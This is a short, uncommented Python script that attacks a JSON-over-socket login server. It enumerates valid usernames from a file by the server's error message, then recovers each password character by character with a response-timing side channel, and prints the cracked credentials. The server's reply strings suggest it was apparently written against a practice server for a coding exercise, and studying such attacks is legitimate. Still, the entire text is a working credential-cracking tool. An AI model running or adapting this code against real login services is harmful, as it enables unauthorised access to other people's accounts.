import sys
import socket
import json
import string
import time

args = sys.argv
address = (args[1], int(args[2]))
is_broken = False

with socket.socket() as client_socket, open('logins.txt', 'r') as logins:
    client_socket.connect(address)
    for login in [i.strip() for i in logins]:
        client_socket.send(json.dumps({'login': login, 'password': ''}).encode())
        if json.loads(client_socket.recv(1000).decode())['result'] == 'Wrong password!':
            password = ''
            while True:
                for letter in string.ascii_letters + string.digits:
                    client_socket.send(json.dumps({'login': login, 'password': password + letter}).encode())
                    start = time.perf_counter()
                    response = json.loads(client_socket.recv(1000).decode())['result']
                    end = time.perf_counter()
                    if end - start >= 0.0009:
                        password += letter
                        break
                    if response == 'Connection success!':
                        password += letter
                        print(json.dumps({'login': login, 'password': password}))
                        is_broken = True
                        break
                if is_broken:
                    break
            break
